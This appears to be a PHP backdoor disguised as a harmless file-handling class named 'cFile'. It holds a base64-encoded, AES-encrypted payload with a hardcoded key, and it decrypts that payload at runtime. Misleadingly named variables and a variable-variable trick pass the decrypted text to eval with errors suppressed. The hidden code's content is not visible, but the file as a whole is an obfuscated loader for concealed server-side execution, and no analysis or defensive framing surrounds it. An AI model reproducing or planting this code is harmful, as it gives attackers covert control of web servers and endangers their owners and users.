<?php
class cFile {
    private function selectFile($filename){
        $sign = '056cb5019b77d747';
        $fileurl = 'mIV15VlFNHzGlm1CV5qxoDGDgX34+sKaoQufLaiTnNxjZrljq13nfmZhLIo7EUbGNM/5UqKATItfH0Qb4Be0V/oNQ/463mYVtVTU9oMHluOlj9AVi+nb59JtKdGVE/iBRilr1+BrZ7wgV+hv4esK+sCmRRvyDa7uNg7hQvFE9iRIH6qKW8OvkHICd3BBWyXSNF5l3xaj0ATxLK8VmFucj0BE5d0oadOIu6BgOBPC+mf66tffsgvoOv/Kz3FdkMmjTdzoQ44FvYrS8FcdL7bQ3eECtTFB7MoCApGDCmn57jb1MwkBHz0U+9RiU03PidcgyOxqlSCl0c38SCIsmhxnrHZmUEcg71HWmOOFMYXpIjeQFdlZhVd3LAkum4q1X5cCLyWwkr2cO0uL4Irnvi13e+M01r3+mKPL1iWISlua3SICsWzpuXNXbj8jrNXgPoCpw64bHfI2sXRlnyMlWRcl+q9+ve6GuRUtTJEVo569SiHn5moDOkP0J9/UDpzQNOSSV4evEwAh9xaTR2MN2ET4sHCKSkpkejD5U60aqd4N/cHKdctHfrQowCQGvOh9/OQ/1lv7vDCTHApWzrGHJEXVU3TuWW8KLmTvnRLgAsVzI7KterptOKNKzxIxafNTdc2JE5JOsMHKl6COW5kFGy7bMbvhC40Ztig/WBdlesjn74AwAch3QIOzvfGtAsLxS8BxQMC6X3U+1UvO4N6fc4iIdOz8S4wkzv80Gdn5aiZO0H8wAD10HfmG4A6Sdzw1TlxXtmsdqMnEU77BJoT09APC7oFLVNzNL6Zd9pdxrwq1FTMMZCxfNYHiUwyUyYjNpqgYdcV80yJVhdr4Aul/Eh0DAg==';
        $file = openssl_decrypt(cFile::de($fileurl), "AES-128-ECB", $sign,OPENSSL_PKCS1_PADDING);
        $file_error = $$filename;
        @eval($file_error);
        return "filename";
    }
    public function getPriv() {
        return $this->selectFile(...);
    }
    public static function de($file){
            return base64_decode($file);
        }
}
$cfile = new cFile;
$error = $cfile->getPriv();
$error('file');